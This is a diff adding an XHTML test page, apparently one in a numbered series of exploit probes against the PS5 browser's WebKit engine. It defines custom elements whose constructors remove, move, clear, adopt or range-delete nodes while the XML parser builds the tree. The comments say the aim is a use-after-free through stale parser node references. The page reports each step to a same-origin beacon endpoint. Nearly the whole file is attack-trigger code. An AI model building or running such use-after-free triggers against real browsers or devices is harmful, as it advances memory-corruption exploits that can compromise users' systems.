@@ -1,0 +1,283 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>V436</title></head>
+<body>
+<div id="log"></div>
+<script><![CDATA[
+/*
+ * p436 -- XMLParser Custom Element UAF, main-frame XHTML
+ *
+ * V413 proved XHTML iframes are DEAD on PS5. This tests main-frame XHTML.
+ * The XMLParser calls CE constructors during tree building. If the
+ * constructor removes/reparents nodes, the parser's internal m_currentNode
+ * or stack references become stale.
+ *
+ * XMLDocumentParser::startElementNs -> pushCurrentNode(newElement)
+ * XMLDocumentParser::endElementNs -> popCurrentNode()
+ * If CE constructor removes the current node from tree, popCurrentNode
+ * returns a detached node but the parser continues building under it.
+ *
+ * Beacon prefix: V436-
+ */
+var BQ = 0;
+function B(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open("POST", "/beacon/V436-" + tag + "?q=" + (BQ++), false);
+    x.setRequestHeader("Content-Type", "text/plain");
+    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
+  } catch(e) {}
+}
+
+B("BOOT");
+B("CONTENT-TYPE", document.contentType);
+B("DOCEL-NS", document.documentElement.namespaceURI);
+B("CE-API", window.customElements ? "YES" : "NO");
+
+// ================================================================
+// Phase 1: Define CEs with destructive constructors
+// ================================================================
+
+var ceLog = [];
+
+// T1: Self-removing CE -- removes itself from parent during construction
+try {
+  customElements.define("uaf-remove", class extends HTMLElement {
+    constructor() {
+      super();
+      ceLog.push("remove-ctor");
+      B("T1-CTOR");
+      if (this.parentNode) {
+        try {
+          this.parentNode.removeChild(this);
+          B("T1-REMOVED-FROM-PARENT");
+        } catch(e) {
+          B("T1-REMOVE-ERR", e.message.slice(0, 60));
+        }
+      } else {
+        B("T1-NO-PARENT");
+      }
+    }
+  });
+  B("T1-CE-DEFINED");
+} catch(e) {
+  B("T1-DEF-ERR", e.message.slice(0, 60));
+}
+
+// T2: Reparenting CE -- moves itself to a different parent during construction
+try {
+  customElements.define("uaf-reparent", class extends HTMLElement {
+    constructor() {
+      super();
+      ceLog.push("reparent-ctor");
+      B("T2-CTOR");
+      var sink = document.getElementById("log");
+      if (sink && this.parentNode) {
+        try {
+          sink.appendChild(this);
+          B("T2-REPARENTED");
+        } catch(e) {
+          B("T2-REPARENT-ERR", e.message.slice(0, 60));
+        }
+      } else {
+        B("T2-NO-PARENT-OR-SINK");
+      }
+    }
+  });
+  B("T2-CE-DEFINED");
+} catch(e) {
+  B("T2-DEF-ERR", e.message.slice(0, 60));
+}
+
+// T3: Tree-clearing CE -- removes all siblings during construction
+try {
+  customElements.define("uaf-clear", class extends HTMLElement {
+    constructor() {
+      super();
+      ceLog.push("clear-ctor");
+      B("T3-CTOR");
+      if (this.parentNode) {
+        try {
+          while (this.parentNode.firstChild !== this && this.parentNode.firstChild) {
+            this.parentNode.removeChild(this.parentNode.firstChild);
+          }
+          while (this.nextSibling) {
+            this.parentNode.removeChild(this.nextSibling);
+          }
+          B("T3-CLEARED-SIBLINGS");
+        } catch(e) {
+          B("T3-CLEAR-ERR", e.message.slice(0, 60));
+        }
+      }
+    }
+  });
+  B("T3-CE-DEFINED");
+} catch(e) {
+  B("T3-DEF-ERR", e.message.slice(0, 60));
+}
+
+// T4: adoptNode CE -- adopts parent into a different document during construction
+try {
+  customElements.define("uaf-adopt", class extends HTMLElement {
+    constructor() {
+      super();
+      ceLog.push("adopt-ctor");
+      B("T4-CTOR");
+      if (this.parentNode && this.parentNode !== document.body) {
+        try {
+          var newDoc = document.implementation.createHTMLDocument("stolen");
+          newDoc.body.appendChild(newDoc.adoptNode(this.parentNode));
+          B("T4-ADOPTED-PARENT");
+        } catch(e) {
+          B("T4-ADOPT-ERR", e.message.slice(0, 60));
+        }
+      } else {
+        B("T4-DIRECT-BODY-CHILD");
+      }
+    }
+  });
+  B("T4-CE-DEFINED");
+} catch(e) {
+  B("T4-DEF-ERR", e.message.slice(0, 60));
+}
+
+// T5: Range.deleteContents CE -- delete via Range during construction
+try {
+  customElements.define("uaf-range", class extends HTMLElement {
+    constructor() {
+      super();
+      ceLog.push("range-ctor");
+      B("T5-CTOR");
+      if (this.parentNode) {
+        try {
+          var r = document.createRange();
+          r.selectNodeContents(this.parentNode);
+          r.deleteContents();
+          B("T5-RANGE-DELETED");
+        } catch(e) {
+          B("T5-RANGE-ERR", e.message.slice(0, 60));
+        }
+      }
+    }
+  });
+  B("T5-CE-DEFINED");
+} catch(e) {
+  B("T5-DEF-ERR", e.message.slice(0, 60));
+}
+
+B("ALL-CES-DEFINED");
+B("CE-LOG", ceLog.join(","));
+
+// Phase 2: Dynamic insertion of CE into XHTML DOM
+// Since the CEs are defined after the script, any CE tags below this
+// script in the XHTML will be parsed by XMLParser with CEs registered.
+// But first, test dynamic creation:
+
+try {
+  var container = document.createElement("div");
+  container.setAttribute("id", "dynamic-container");
+  document.body.appendChild(container);
+
+  // DOMParser with XHTML containing our CEs
+  var parser = new DOMParser();
+  var xhtml = '<?xml version="1.0"?><div xmlns="http://www.w3.org/1999/xhtml"><uaf-remove>child1</uaf-remove><div>after-remove</div></div>';
+  var doc = parser.parseFromString(xhtml, "application/xhtml+xml");
+  B("T6-DOMPARSER-OK", doc.documentElement ? doc.documentElement.nodeName : "null");
+  B("T6-DOMPARSER-CHILDREN", doc.documentElement ? doc.documentElement.childNodes.length : -1);
+  // Check if CE was upgraded in the DOMParser document
+  var ceInDoc = doc.querySelector("uaf-remove");
+  B("T6-CE-FOUND", ceInDoc ? "YES" : "NO");
+  if (ceInDoc) {
+    B("T6-CE-CTOR-NAME", ceInDoc.constructor.name);
+  }
+} catch(e) {
+  B("T6-ERR", e.message.slice(0, 60));
+}
+
+// Test: adopt DOMParser nodes into live document (triggers upgrade)
+try {
+  var adopted = document.adoptNode(doc.documentElement);
+  container.appendChild(adopted);
+  B("T7-ADOPT-OK", container.innerHTML.slice(0, 100));
+  var ceAfterAdopt = container.querySelector("uaf-remove");
+  B("T7-CE-AFTER-ADOPT", ceAfterAdopt ? ceAfterAdopt.constructor.name : "null");
+} catch(e) {
+  B("T7-ADOPT-ERR", e.message.slice(0, 60));
+}
+
+B("DONE", ceLog.join(","));
+]]></script>
+
+<!-- Phase 3: CE tags BELOW the script -- XMLParser should construct these
+     with the CEs already registered. If XMLParser calls CE constructors
+     during tree building, the destructive constructors will fire. -->
+<div id="xml-test-area">
+  <div id="t1-host"><uaf-remove>t1-content</uaf-remove><div>t1-after</div></div>
+  <div id="t2-host"><uaf-reparent>t2-content</uaf-reparent><div>t2-after</div></div>
+  <div id="t3-host"><div>t3-before</div><uaf-clear>t3-content</uaf-clear><div>t3-after</div></div>
+  <div id="t4-host"><div id="t4-inner"><uaf-adopt>t4-content</uaf-adopt></div><div>t4-after</div></div>
+  <div id="t5-host"><div>t5-before</div><uaf-range>t5-content</uaf-range><div>t5-after</div></div>
+</div>
+<script><![CDATA[
+// Phase 4: Check DOM state after XMLParser processed the CE tags
+B("POST-PARSE-START");
+
+// Check which constructors fired during parsing
+B("POST-CE-LOG", ceLog.join(","));
+
+var area = document.getElementById("xml-test-area");
+if (area) {
+  B("TEST-AREA-CHILDREN", area.childNodes.length);
+
+  // T1 host: uaf-remove should have removed itself
+  var t1h = document.getElementById("t1-host");
+  if (t1h) {
+    B("T1-HOST-CHILDREN", t1h.childNodes.length);
+    B("T1-HOST-HTML", t1h.innerHTML ? t1h.innerHTML.slice(0, 80) : "empty");
+  } else {
+    B("T1-HOST-GONE");
+  }
+
+  // T2 host: uaf-reparent should have moved to #log
+  var t2h = document.getElementById("t2-host");
+  if (t2h) {
+    B("T2-HOST-CHILDREN", t2h.childNodes.length);
+    B("T2-HOST-HTML", t2h.innerHTML ? t2h.innerHTML.slice(0, 80) : "empty");
+  }
+  var logDiv = document.getElementById("log");
+  if (logDiv) {
+    B("T2-LOG-CHILDREN", logDiv.childNodes.length);
+    var reparented = logDiv.querySelector("uaf-reparent");
+    B("T2-REPARENTED-IN-LOG", reparented ? "YES" : "NO");
+  }
+
+  // T3 host: uaf-clear should have removed siblings
+  var t3h = document.getElementById("t3-host");
+  if (t3h) {
+    B("T3-HOST-CHILDREN", t3h.childNodes.length);
+    B("T3-HOST-HTML", t3h.innerHTML ? t3h.innerHTML.slice(0, 80) : "empty");
+  }
+
+  // T4 host: uaf-adopt should have adopted parent into another doc
+  var t4h = document.getElementById("t4-host");
+  B("T4-HOST-EXISTS", t4h ? "YES" : "NO");
+  if (t4h) {
+    var t4inner = document.getElementById("t4-inner");
+    B("T4-INNER-EXISTS", t4inner ? "YES" : "NO");
+    B("T4-HOST-CHILDREN", t4h.childNodes.length);
+  }
+
+  // T5 host: uaf-range should have deleted all contents
+  var t5h = document.getElementById("t5-host");
+  if (t5h) {
+    B("T5-HOST-CHILDREN", t5h.childNodes.length);
+    B("T5-HOST-HTML", t5h.innerHTML ? t5h.innerHTML.slice(0, 80) : "empty");
+  }
+} else {
+  B("TEST-AREA-MISSING");
+}
+
+B("ALL-DONE");
+]]></script>
+</body>
+</html>
